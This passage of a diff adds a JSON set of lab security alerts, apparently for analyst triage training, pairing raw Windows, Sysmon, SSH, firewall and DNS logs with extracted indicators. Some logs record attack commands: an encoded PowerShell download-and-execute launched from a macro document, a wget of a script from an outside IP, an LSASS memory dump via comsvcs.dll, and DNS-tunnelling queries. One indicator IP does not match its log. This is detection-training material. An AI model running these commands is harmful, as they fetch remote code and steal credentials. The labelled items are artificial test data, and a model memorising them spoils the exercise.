Name='Hashes'>MD5=3688608BF16F41B6AFBC8499A61148A0,SHA256=4A1885BECEBFA04D5F6B978C4BBB24A6465AC576DCBB6E8E2CDD2DFAA1699A17,IMPHASH=798C01DD5C526B4537AD35E765EFAB87</Data><Data Name='ParentProcessGuid'>{679a8f89-e28d-676a-2906-000000000c00}</Data><Data Name='ParentProcessId'>4268</Data><Data Name='ParentImage'>C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe</Data><Data Name='ParentCommandLine'>\"C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe\" service</Data><Data Name='ParentUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powershell.exe",
+        "source": "Image"
+      },
+      {
+        "type": "hash",
+        "value": "4A1885BECEBFA04D5F6B978C4BBB24A6465AC576DCBB6E8E2CDD2DFAA1699A17",
+        "source": "Hashes"
+      },
+      {
+        "type": "user",
+        "value": "SYSTEM",
+        "source": "User"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-019",
+    "alert_name": "Microsoft Edge updater process executed as SYSTEM",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:57:53.8005256Z'/><EventRecordID>45234</EventRecordID><Correlation/><Execution ProcessID='4600' ThreadID='1452'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>KBTG-Bootcamp</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:57:53.799</Data><Data Name='ProcessGuid'>{679a8f89-f621-676a-a808-000000000c00}</Data><Data Name='ProcessId'>4280</Data><Data Name='Image'>C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe</Data><Data Name='FileVersion'>1.3.135.41</Data><Data Name='Description'>Microsoft Edge Update</Data><Data Name='Product'>Microsoft Edge Update</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>msedgeupdate.dll</Data><Data Name='CommandLine'>\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /ua /installsource core</Data><Data Name='CurrentDirectory'>C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\1.3.195.43\\</Data><Data Name='User'>NT AUTHORITY\\SYSTEM</Data><Data Name='LogonGuid'>{679a8f89-83c2-676a-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8661FBB97161096BE503CD295AA46409,SHA256=BEF9DBED290AF17CF3F30CC43FC0A94CDADC540F171C25DF1363B2E852D0A042,IMPHASH=30AD68B9DC9737D8C720DD9284051ADD</Data><Data Name='ParentProcessGuid'>{679a8f89-843c-676a-9c00-000000000c00}</Data><Data Name='ParentProcessId'>6724</Data><Data Name='ParentImage'>C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe</Data><Data Name='ParentCommandLine'>\"C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\" /c</Data><Data Name='ParentUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe",
+        "source": "Image"
+      },
+      {
+        "type": "hash",
+        "value": "BEF9DBED290AF17CF3F30CC43FC0A94CDADC540F171C25DF1363B2E852D0A042",
+        "source": "Hashes"
+      },
+      {
+        "type": "user",
+        "value": "SYSTEM",
+        "source": "User"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-020",
+    "alert_name": "DNS name resolution timeout on endpoint (EventCode 1014)",
+    "raw_log": "12/24/2024 09:57:10 AM\nLogName=System\nEventCode=1014\nEventType=3\nComputerName=KBTG-Bootcamp\nUser=NOT_TRANSLATED\nSid=S-1-5-20\nSidType=0\nSourceName=Microsoft-Windows-DNS Client Events\nType=Warning\nRecordNumber=3793\nKeywords=None\nTaskCategory=1014\nOpCode=Info\nMessage=Name resolution for the name wpad timed out after none of the configured DNS servers responded.",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "KBTG-Bootcamp",
+        "source": "ComputerName"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-021",
+    "alert_name": "Failed Login Exceeds Threshold (Brute Force)",
+    "raw_log": "12/24/2024 10:10:00 AM\nLogName=Security\nEventCode=4625\nEventType=0\nComputerName=FS-01\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=220000\nKeywords=Audit Failure\nTaskCategory=Logon\nOpCode=Info\nMessage=An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\tadministrator\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tWorkstation Name:\tKALI\n\tSource Network Address:\t10.10.30.66\n\tSource Port:\t\t56279\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.30.66",
+        "source": "Source_Network_Address"
+      },
+      {
+        "type": "host",
+        "value": "FS-01",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "administrator",
+        "source": "Account_Name"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-022",
+    "alert_name": "UC-AUTH-002 - SSH Brute Force Followed by Successful Login",
+    "raw_log": "2024-12-24T18:25:39+00:00 web-02 sshd[2500]: Accepted password for deploy from 203.0.113.45 port 51200 ssh2",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "203.0.113.45",
+        "source": "src"
+      },
+      {
+        "type": "host",
+        "value": "web-02",
+        "source": "host"
+      },
+      {
+        "type": "user",
+        "value": "deploy",
+        "source": "user"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-023",
+    "alert_name": "Port Scan Detected",
+    "raw_log": "date=2024-12-24 time=18:32:05 devname=\"FGT-01\" devid=\"FG100FTK19000001\" logid=\"0000000011\" type=\"traffic\" subtype=\"forward\" level=\"warning\" srcip=10.10.40.23 srcport=52892 srcintf=\"lan\" dstip=10.10.50.20 dstport=55470 dstintf=\"dmz\" proto=6 action=\"deny\" policyid=99 service=\"tcp/55470\" dstcountry=\"Reserved\" sentbyte=0 rcvdbyte=0",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.40.23",
+        "source": "srcip"
+      },
+      {
+        "type": "ip",
+        "value": "10.10.50.10",
+        "source": "dstip"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-024",
+    "alert_name": "C2 Beaconing Detected",
+    "raw_log": "date=2024-12-24 time=18:59:08 devname=\"FGT-01\" devid=\"FG100FTK19000001\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" srcip=10.10.20.77 srcport=55230 srcintf=\"lan\" dstip=45.83.122.9 dstport=443 dstintf=\"wan1\" proto=6 action=\"accept\" policyid=1 service=\"HTTPS\" dstcountry=\"Netherlands\" sentbyte=535 rcvdbyte=1183",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.20.77",
+        "source": "srcip"
+      },
+      {
+        "type": "ip",
+        "value": "45.83.122.9",
+        "source": "dstip"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-025",
+    "alert_name": "DNS Tunneling Detected",
+    "raw_log": "24-Dec-2024 18:51:58.315 queries: info: client @0x7f3a4003 10.10.20.88#11776 (g66ejgnuemaex7owfsn4oz3rkz2y3h2r45uhegkt575ssrsw6imo6ugpul.57.t1.exfil-dns.net): query: g66ejgnuemaex7owfsn4oz3rkz2y3h2r45uhegkt575ssrsw6imo6ugpul.57.t1.exfil-dns.net IN TXT + (10.10.1.53)",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.20.88",
+        "source": "src"
+      },
+      {
+        "type": "domain",
+        "value": "exfil-dns.net",
+        "source": "query"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-026",
+    "alert_name": "Encoded PowerShell Execution",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:45:09.8000000Z'/><EventRecordID>91001</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS-12.corp.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:45:09.800</Data><Data Name='ProcessGuid'>{da820302-6a1f-6767-1a03-000000000a00}</Data><Data Name='ProcessId'>6619</Data><Data Name='Image'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>powershell.exe</Data><Data Name='CommandLine'>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AOAAzAC4AMQAyADIALgA5AC8AYQAuAHAAcwAxACcAKQA=</Data><Data Name='CurrentDirectory'>C:\\Users\\Public\\</Data><Data Name='User'>CORP\\kittipong.s</Data><Data Name='LogonGuid'>{6a1f6767-1a03-0000-0000-000000000000}</Data><Data Name='LogonId'>0x3E7</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=53DADC40BB276161FBB4864750877D9641EBE8A5DEE5CE338D2554171EEBC6D1</Data><Data Name='ParentProcessGuid'>{6a1f6767-1a03-6767-0000-000000000b00}</Data><Data Name='ParentProcessId'>3026</Data><Data Name='ParentImage'>C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name='ParentCommandLine'>\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\kittipong.s\\Downloads\\Invoice_Dec2024.docm\"</Data><Data Name='ParentUser'>CORP\\kittipong.s</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "WS-12.corp.local",
+        "source": "Computer"
+      },
+      {
+        "type": "user",
+        "value": "CORP\\kittipong.s",
+        "source": "User"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "source": "Image"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-027",
+    "alert_name": "UC-EDR-003 - LSASS Memory Access (Credential Dumping)",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T18:16:30.9000000Z'/><EventRecordID>91004</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FS-01.corp.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 18:16:30.900</Data><Data Name='SourceProcessGUID'>{6a1f6767-1a03-6767-0000-000000000c00}</Data><Data Name='SourceProcessId'>2017</Data><Data Name='SourceThreadId'>5306</Data><Data Name='SourceImage'>C:\\Windows\\System32\\rundll32.exe</Data><Data Name='TargetProcessGUID'>{6a1f6767-0001-6767-0000-000000000d00}</Data><Data Name='TargetProcessId'>640</Data><Data Name='TargetImage'>C:\\Windows\\system32\\lsass.exe</Data><Data Name='GrantedAccess'>0x1FFFFF</Data><Data Name='CallTrace'>C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\KERNELBASE.dll+2c0fe|UNKNOWN(00007FF8A1B2C3D4)</Data><Data Name='SourceUser'>CORP\\svc_backup</Data><Data Name='TargetUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "FS-01.corp.local",
+        "source": "Computer"
+      },
+      {
+        "type": "user",
+        "value": "CORP\\svc_backup",
+        "source": "SourceUser"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\System32\\rundll32.exe",
+        "source": "SourceImage"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-028",
+    "alert_name": "Password Spray",
+    "raw_log": "12/24/2024 10:11:39 AM\nLogName=Security\nEventCode=4625\nEventType=0\nComputerName=FS-01\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=220071\nKeywords=Audit Failure\nTaskCategory=Logon\nOpCode=Info\nMessage=An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\toperator\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC0000064\n\nNetwork Information:\n\tWorkstation Name:\tKALI\n\tSource Network Address:\t10.10.30.66\n\tSource Port:\t\t51397\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.30.66",
+        "source": "Source_Network_Address"
+      },
+      {
+        "type": "host",
+        "value": "FS-01",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "operator",
+        "source": "Account_Name"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-029",
+    "alert_name": "Successful Logon After Multiple Failed Attempts",
+    "use_case_id": "UC-AUTH-001",
+    "raw_log": "12/24/2024 10:13:48 AM\nLogName=Security\nEventCode=4624\nEventType=0\nComputerName=FS-01\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=220160\nKeywords=Audit Success\nTaskCategory=Logon\nOpCode=Info\nMessage=An account was successfully logged on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Information:\n\tLogon Type:\t\t3\n\tRestricted Admin Mode:\t-\n\tVirtual Account:\t\tNo\n\tElevated Token:\t\tYes\n\nNew Logon:\n\tSecurity ID:\t\tCORP\\svc_backup\n\tAccount Name:\t\tsvc_backup\n\tAccount Domain:\t\tCORP\n\tLogon ID:\t\t0xC7E719\n\nNetwork Information:\n\tWorkstation Name:\tKALI\n\tSource Network Address:\t10.10.30.66\n\tSource Port:\t\t52270\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.30.66",
+        "source": "Source_Network_Address"
+      },
+      {
+        "type": "host",
+        "value": "FS-01",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "svc_backup",
+        "source": "Account_Name"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-030",
+    "alert_name": "UC-AUTH-002 - Suspicious sudo command after SSH login",
+    "raw_log": "2024-12-24T18:26:44+00:00 web-02 sudo:   deploy : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://45.83.122.9/x.sh -O /tmp/x.sh",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "web-02",
+        "source": "host"
+      },
+      {
+        "type": "user",
+        "value": "deploy",
+        "source": "user"
+      },
+      {
+        "type": "url",
+        "value": "http://45.83.122.9/x.sh",
+        "source": "command"
+      },
+      {
+        "type": "ip",
+        "value": "45.83.122.9",
+        "source": "command"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-031",
+    "alert_name": "Linux SSH Brute Force",
+    "raw_log": "2024-12-24T18:25:24+00:00 web-02 sshd[2489]: Failed password for root from 203.0.113.45 port 47642 ssh2",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "203.0.113.45",
+        "source": "src"
+      },
+      {
+        "type": "host",
+        "value": "web-02",
+        "source": "host"
+      },
+      {
+        "type": "user",
+        "value": "root",
+        "source": "user"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-032",
+    "alert_name": "FortiGate - Multiple denied connections from internal host",
+    "use_case_id": "UC-NET-001",
+    "raw_log": "date=2024-12-24 time=18:32:05 devname=\"FGT-01\" devid=\"FG100FTK19000001\" logid=\"0000000011\" type=\"traffic\" subtype=\"forward\" level=\"warning\" srcip=10.10.40.23 srcport=52892 srcintf=\"lan\" dstip=10.10.50.20 dstport=55470 dstintf=\"dmz\" proto=6 action=\"deny\" policyid=99 service=\"tcp/55470\" dstcountry=\"Reserved\" sentbyte=0 rcvdbyte=0",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.40.23",
+        "source": "srcip"
+      },
+      {
+        "type": "ip",
+        "value": "10.10.50.20",
+        "source": "dstip"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-033",
+    "alert_name": "Periodic Outbound Connection",
+    "raw_log": "date=2024-12-24 time=16:00:07 devname=\"FGT-01\" devid=\"FG100FTK19000001\" logid=\"0000000013\" type=\"traffic\" subtype=\"forward\" level=\"notice\" srcip=10.10.20.77 srcport=61170 srcintf=\"lan\" dstip=45.83.122.9 dstport=443 dstintf=\"wan1\" proto=6 action=\"accept\" policyid=1 service=\"HTTPS\" dstcountry=\"Netherlands\" sentbyte=537 rcvdbyte=1257",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.20.77",
+        "source": "srcip"
+      },
+      {
+        "type": "ip",
+        "value": "45.83.122.9",
+        "source": "dstip"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-034",
+    "alert_name": "DNS Exfiltration",
+    "raw_log": "24-Dec-2024 18:40:00.000 queries: info: client @0x7f3a2191 10.10.20.88#15285 (aumbzn7jaj2cmcpoe5r3bw3jpqmlnlld43bhautbrkevwlzyp5zfumt5c.0.t1.exfil-dns.net): query: aumbzn7jaj2cmcpoe5r3bw3jpqmlnlld43bhautbrkevwlzyp5zfumt5c.0.t1.exfil-dns.net IN TXT + (10.10.1.53)",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.20.88",
+        "source": "src"
+      },
+      {
+        "type": "domain",
+        "value": "exfil-dns.net",
+        "source": "query"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-035",
+    "alert_name": "Macro-enabled Office document opened from Downloads",
+    "use_case_id": "UC-EDR-002",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:45:02.3000000Z'/><EventRecordID>91000</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS-12.corp.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:45:02.300</Data><Data Name='ProcessGuid'>{3e0315ce-6a1f-6767-1a03-000000000a00}</Data><Data Name='ProcessId'>2994</Data><Data Name='Image'>C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>WINWORD.EXE</Data><Data Name='CommandLine'>\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\kittipong.s\\Downloads\\Invoice_Dec2024.docm\"</Data><Data Name='CurrentDirectory'>C:\\Users\\Public\\</Data><Data Name='User'>CORP\\kittipong.s</Data><Data Name='LogonGuid'>{6a1f6767-1a03-0000-0000-000000000000}</Data><Data Name='LogonId'>0x3E7</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=FC61E2D6106F8E95A6F438050390C1B42E8785E8FA4B8E3C77CAA6E5B7DE9B25</Data><Data Name='ParentProcessGuid'>{6a1f6767-1a03-6767-0000-000000000b00}</Data><Data Name='ParentProcessId'>1605</Data><Data Name='ParentImage'>C:\\Windows\\explorer.exe</Data><Data Name='ParentCommandLine'>C:\\Windows\\Explorer.EXE</Data><Data Name='ParentUser'>CORP\\kittipong.s</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "WS-12.corp.local",
+        "source": "Computer"
+      },
+      {
+        "type": "user",
+        "value": "CORP\\kittipong.s",
+        "source": "User"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "source": "Image"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-036",
+    "alert_name": "Credential Dumping",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T18:16:30.5000000Z'/><EventRecordID>91003</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FS-01.corp.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 18:16:30.500</Data><Data Name='ProcessGuid'>{ca96e592-6a1f-6767-1a03-000000000a00}</Data><Data Name='ProcessId'>2263</Data><Data Name='Image'>C:\\Windows\\System32\\rundll32.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>rundll32.exe</Data><Data Name='CommandLine'>C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Users\\Public\\d.dmp full</Data><Data Name='CurrentDirectory'>C:\\Users\\Public\\</Data><Data Name='User'>CORP\\svc_backup</Data><Data Name='LogonGuid'>{6a1f6767-1a03-0000-0000-000000000000}</Data><Data Name='LogonId'>0x3E7</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>SHA256=3A0586CF75968D78D00A3C8C95491E6055AEFE6151242CAAAE3536077E12027A</Data><Data Name='ParentProcessGuid'>{6a1f6767-1a03-6767-0000-000000000b00}</Data><Data Name='ParentProcessId'>3190</Data><Data Name='ParentImage'>C:\\Windows\\System32\\cmd.exe</Data><Data Name='ParentCommandLine'>cmd.exe /c</Data><Data Name='ParentUser'>CORP\\svc_backup</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "FS-01.corp.local",
+        "source": "Computer"
+      },
+      {
+        "type": "user",
+        "value": "CORP\\svc_backup",
+        "source": "User"
+      },
+      {
+        "type": "process",
+        "value": "C:\\Windows\\System32\\rundll32.exe",
+        "source": "Image"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-037",
+    "alert_name": "Failed Login Exceeds Threshold (Brute Force)",
+    "raw_log": "12/24/2024 01:02:09 AM\nLogName=Security\nEventCode=4625\nEventType=0\nComputerName=FS-01\nSourceName=Microsoft Windows security auditing.\nType=Information\nRecordNumber=220162\nKeywords=Audit Failure\nTaskCategory=Logon\nOpCode=Info\nMessage=An account failed to log on.\n\nSubject:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\t-\n\tAccount Domain:\t\t-\n\tLogon ID:\t\t0x0\n\nLogon Type:\t\t\t3\n\nAccount For Which Logon Failed:\n\tSecurity ID:\t\tNULL SID\n\tAccount Name:\t\tsomchai.k\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tFailure Reason:\t\tUnknown user name or bad password.\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nNetwork Information:\n\tWorkstation Name:\tWS-21\n\tSource Network Address:\t10.10.20.21\n\tSource Port:\t\t62310\n\nDetailed Authentication Information:\n\tLogon Process:\t\tNtLmSsp\n\tAuthentication Package:\tNTLM",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.20.21",
+        "source": "Source_Network_Address"
+      },
+      {
+        "type": "host",
+        "value": "FS-01",
+        "source": "ComputerName"
+      },
+      {
+        "type": "user",
+        "value": "somchai.k",
+        "source": "Account_Name"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-038",
+    "alert_name": "SSH Brute Force Followed by Successful Login",
+    "raw_log": "2024-12-24T07:32:02+00:00 web-02 sshd[2553]: Failed password for invalid user admin from 198.51.100.165 port 33558 ssh2",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "198.51.100.165",
+        "source": "src"
+      },
+      {
+        "type": "host",
+        "value": "web-02",
+        "source": "host"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-039",
+    "alert_name": "LSASS Memory Access (Credential Dumping)",
+    "raw_log": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-24T17:07:23.4232660Z'/><EventRecordID>91059</EventRecordID><Correlation/><Execution ProcessID='3344' ThreadID='4012'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FS-01.corp.local</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-24 17:07:23.423</Data><Data Name='SourceProcessGUID'>{6a1f6767-1a03-6767-0000-000000000c00}</Data><Data Name='SourceProcessId'>8889</Data><Data Name='SourceThreadId'>3307</Data><Data Name='SourceImage'>C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe</Data><Data Name='TargetProcessGUID'>{6a1f6767-0001-6767-0000-000000000d00}</Data><Data Name='TargetProcessId'>640</Data><Data Name='TargetImage'>C:\\Windows\\system32\\lsass.exe</Data><Data Name='GrantedAccess'>0x1000</Data><Data Name='CallTrace'>C:\\Windows\\SYSTEM32\\ntdll.dll+9d204|C:\\Windows\\System32\\KERNELBASE.dll+2c0fe|UNKNOWN(00007FF8A1B2C3D4)</Data><Data Name='SourceUser'>NT AUTHORITY\\SYSTEM</Data><Data Name='TargetUser'>NT AUTHORITY\\SYSTEM</Data></EventData></Event>",
+    "indicators": [
+      {
+        "type": "host",
+        "value": "FS-01.corp.local",
+        "source": "Computer"
+      },
+      {
+        "type": "process",
+        "value": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
+        "source": "SourceImage"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-040",
+    "alert_name": "DNS Tunneling Detected",
+    "raw_log": "24-Dec-2024 19:02:49.424 queries: info: client @0x7f3a4138 10.10.10.25#35362 (_spf.google.com): query: _spf.google.com IN TXT + (10.10.1.53)",
+    "indicators": [
+      {
+        "type": "ip",
+        "value": "10.10.10.25",
+        "source": "src"
+      },
+      {
+        "type": "domain",
+        "value": "_spf.google.com",
+        "source": "query"
+      }
+    ]
+  },
+  {
+    "alert_id": "FSR-LAB-041",
+    "alert_name": "Port Scan Detected",
